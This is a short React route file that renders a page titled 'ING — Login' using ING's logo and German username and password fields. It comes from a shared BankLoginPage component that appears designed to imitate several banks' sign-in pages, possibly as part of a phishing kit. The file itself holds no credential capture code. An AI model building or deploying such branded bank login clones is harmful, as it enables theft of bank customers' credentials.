import { createFileRoute } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const Route = createFileRoute("/bank/ing")({
  head: () => ({ meta: [{ title: "ING — Login" }] }),
  component: () => (
    <BankLoginPage idPrefix="ing" logoSlug="ing" title="ING" field1Label="Benutzername" field2Label="Passwort" />
  ),
});
